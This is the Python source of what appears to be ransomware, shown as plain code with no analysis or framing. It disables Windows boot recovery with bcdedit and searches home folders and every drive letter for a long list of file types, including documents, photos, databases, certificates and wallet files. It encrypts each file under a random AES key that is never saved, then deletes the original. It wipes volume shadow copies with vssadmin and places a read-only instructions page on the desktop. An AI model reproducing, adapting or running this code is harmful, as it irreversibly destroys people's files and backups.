import os, fnmatch, struct, random, string, base64, platform, sys, time, socket, json, urllib, ctypes, urllib2, webbrowser
from Crypto import Random
from Crypto.Cipher import AES
from urllib import urlretrieve
from urllib import urlopen
newextns = 'AESEncrypted'
encfolder = 'your_files'
userhome = os.path.expanduser('~')
glob_config = None
html = """<!DOCTYPE html>
<html lang="en">
<head>
<p>message</p>
</head>
"""
try:
    os.system('bcdedit /set {default} recoveryenabled No')
    os.system('bcdedit /set {default} bootstatuspolicy ignoreallfailures')
except WindowsError:
    pass

def destroy_shadow_copy():
    try:
        os.system('vssadmin Delete Shadows /All /Quiet')
    except:
        pass

def instructionShortcut():
    desktop = userhome + '\\Desktop\\' 
    f = open("instructions.html", "w+")
    f.write(html)
    f.close()
    os.chmod("instructions.html", 0o444)
    f = open(desktop+"instructions.html", "w+")
    f.write(html)
    f.close()
    os.chmod(desktop+"instructions.html", 0o444)

def delete_file(filename):
    try:
        os.remove(filename)
    except:
        pass

def find_files(root_dir):
    extentions = ['*.txt',
     '*.exe',
     '*.php',
     '*.pl',
     '*.7z',
     '*.rar',
     '*.m4a',
     '*.wma',
     '*.avi',
     '*.wmv',
     '*.csv',
     '*.d3dbsp',
     '*.sc2save',
     '*.sie',
     '*.sum',
     '*.ibank',
     '*.t13',
     '*.t12',
     '*.qdf',
     '*.gdb',
     '*.tax',
     '*.pkpass',
     '*.bc6',
     '*.bc7',
     '*.bkp',
     '*.qic',
     '*.bkf',
     '*.sidn',
     '*.sidd',
     '*.mddata',
     '*.itl',
     '*.itdb',
     '*.icxs',
     '*.hvpl',
     '*.hplg',
     '*.hkdb',
     '*.mdbackup',
     '*.syncdb',
     '*.gho',
     '*.cas',
     '*.svg',
     '*.map',
     '*.wmo',
     '*.itm',
     '*.sb',
     '*.fos',
     '*.mcgame',
     '*.vdf',
     '*.ztmp',
     '*.sis',
     '*.sid',
     '*.ncf',
     '*.menu',
     '*.layout',
     '*.dmp',
     '*.blob',
     '*.esm',
     '*.001',
     '*.vtf',
     '*.dazip',
     '*.fpk',
     '*.mlx',
     '*.kf',
     '*.iwd',
     '*.vpk',
     '*.tor',
     '*.psk',
     '*.rim',
     '*.w3x',
     '*.fsh',
     '*.ntl',
     '*.arch00',
     '*.lvl',
     '*.snx',
     '*.cfr',
     '*.ff',
     '*.vpp_pc',
     '*.lrf',
     '*.m2',
     '*.mcmeta',
     '*.vfs0',
     '*.mpqge',
     '*.kdb',
     '*.db0',
     '*.mp3',
     '*.upx',
     '*.rofl',
     '*.hkx',
     '*.bar',
     '*.upk',
     '*.das',
     '*.iwi',
     '*.litemod',
     '*.asset',
     '*.forge',
     '*.ltx',
     '*.bsa',
     '*.apk',
     '*.re4',
     '*.sav',
     '*.lbf',
     '*.slm',
     '*.bik',
     '*.epk',
     '*.rgss3a',
     '*.pak',
     '*.big',
     '*.unity3d',
     '*.wotreplay',
     '*.xxx',
     '*.desc',
     '*.py',
     '*.m3u',
     '*.flv',
     '*.js',
     '*.css',
     '*.rb',
     '*.png',
     '*.jpeg',
     '*.p7c',
     '*.p7b',
     '*.p12',
     '*.pfx',
     '*.pem',
     '*.crt',
     '*.cer',
     '*.der',
     '*.x3f',
     '*.srw',
     '*.pef',
     '*.ptx',
     '*.r3d',
     '*.rw2',
     '*.rwl',
     '*.raw',
     '*.raf',
     '*.orf',
     '*.nrw',
     '*.mrwref',
     '*.mef',
     '*.erf',
     '*.kdc',
     '*.dcr',
     '*.cr2',
     '*.crw',
     '*.bay',
     '*.sr2',
     '*.srf',
     '*.arw',
     '*.3fr',
     '*.dng',
     '*.jpeg',
     '*.jpg',
     '*.cdr',
     '*.indd',
     '*.ai',
     '*.eps',
     '*.pdf',
     '*.pdd',
     '*.psd',
     '*.dbfv',
     '*.mdf',
     '*.wb2',
     '*.rtf',
     '*.wpd',
     '*.dxg',
     '*.xf',
     '*.dwg',
     '*.pst',
     '*.accdb',
     '*.mdb',
     '*.pptm',
     '*.pptx',
     '*.ppt',
     '*.xlk',
     '*.xlsb',
     '*.xlsm',
     '*.xlsx',
     '*.xls',
     '*.wps',
     '*.docm',
     '*.docx',
     '*.doc',
     '*.odb',
     '*.odc',
     '*.odm',
     '*.odp',
     '*.ods',
     '*.odt',
     '*.sql',
     '*.zip',
     '*.tar',
     '*.tar.gz',
     '*.tgz',
     '*.biz',
     '*.ocx',
     '*.html',
     '*.htm',
     '*.3gp',
     '*.srt',
     '*.cpp',
     '*.mid',
     '*.mkv',
     '*.mov',
     '*.asf',
     '*.mpeg',
     '*.vob',
     '*.mpg',
     '*.fla',
     '*.swf',
     '*.wav',
     '*.qcow2',
     '*.vdi',
     '*.vmdk',
     '*.vmx',
     '*.gpg',
     '*.aes',
     '*.ARC',
     '*.PAQ',
     '*.tar.bz2',
     '*.tbk',
     '*.bak',
     '*.djv',
     '*.djvu',
     '*.bmp',
     '*.cgm',
     '*.tif',
     '*.tiff',
     '*.NEF',
     '*.cmd',
     '*.class',
     '*.jar',
     '*.java',
     '*.asp',
     '*.brd',
     '*.sch',
     '*.dch',
     '*.dip',
     '*.vbs',
     '*.asm',
     '*.pas',
     '*.ldf',
     '*.ibd',
     '*.MYI',
     '*.MYD',
     '*.frm',
     '*.dbf',
     '*.SQLITEDB',
     '*.SQLITE3',
     '*.asc',
     '*.lay6',
     '*.lay',
     '*.ms11 (Security copy)',
     '*.sldm',
     '*.sldx',
     '*.ppsm',
     '*.ppsx',
     '*.ppam',
     '*.docb',
     '*.mml',
     '*.sxm',
     '*.otg',
     '*.slk',
     '*.xlw',
     '*.xlt',
     '*.xlm',
     '*.xlc',
     '*.dif',
     '*.stc',
     '*.sxc',
     '*.ots',
     '*.ods',
     '*.hwp',
     '*.dotm',
     '*.dotx',
     '*.docm',
     '*.DOT',
     '*.max',
     '*.xml',
     '*.uot',
     '*.stw',
     '*.sxw',
     '*.ott',
     '*.csr',
     '*.key',
     'wallet.dat']
    for dirpath, dirs, files in os.walk(root_dir):
        if 'Windows' not in dirpath:
            for basename in files:
                for ext in extentions:
                    if fnmatch.fnmatch(basename, ext):
                        filename = os.path.join(dirpath, basename)
                        yield filename

def make_directory(file_path):
    directory = file_path + '' + encfolder
    if not os.path.exists(directory):
        try:
            os.makedirs(directory)
        except:
            pass

def text_generator(size = 6, chars = string.ascii_uppercase + string.digits):
    return ''.join((random.choice(chars) for _ in range(size))) + '.' + newextns

def generate_file(file_path, filename):
    make_directory(file_path)
    key = ''.join([ random.choice(string.ascii_letters + string.digits) for n in xrange(32) ])
    newfilename = file_path + '\\' + encfolder + '\\' + text_generator(36, '1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm')
    try:
        encrypt_file(key, filename, newfilename)
    except:
        pass

def encrypt_file(key, in_filename, newfilename, out_filename = None, chunksize = 65536, Block = 16):
    if not out_filename:
        out_filename = newfilename
    iv = ''.join((chr(random.randint(0, 255)) for i in range(16)))
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_filename)
    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += ' ' * (16 - len(chunk) % 16)
                outfile.write(encryptor.encrypt(chunk))

instructionShortcut()
os.startfile("instructions.html")

listdir = (userhome + '\\Desktop\\',
 userhome + '\\Documents\\',
 userhome + '\\Downloads\\',
 userhome + '\\Music\\',
 userhome + '\\Pictures\\',
 userhome + '\\Videos\\',
 userhome + '\\My Documents\\',
 userhome + '\\My Music\\',
 userhome + '\\My Pictures\\',
 userhome + '\\My Videos\\',
 userhome + '\\Favorites\\',
 userhome + '\\Links\\',
 'C:\\',
 'D:\\',
 'F:\\',
 'E:\\'
 'A:\\',
 'B:\\',
 'G:\\',
 'H:\\',
 'I:\\',
 'J:\\',
 'K:\\',
 'M:\\',
 'N:\\',
 'O:\\',
 'P:\\',
 'Q:\\',
 'R:\\',
 'S:\\',
 'T:\\',
 'T:\\',
 'U:\\',
 'V:\\',
 'W:\\',
 'X:\\',
 'Y:\\',
 'Z:\\')
 
for dir_ in listdir:
    for filename in find_files(dir_):
        generate_file(dir_, filename)
        delete_file(filename)

destroy_shadow_copy()
webbrowser.open("instructions.html", new=1, autoraise=True)
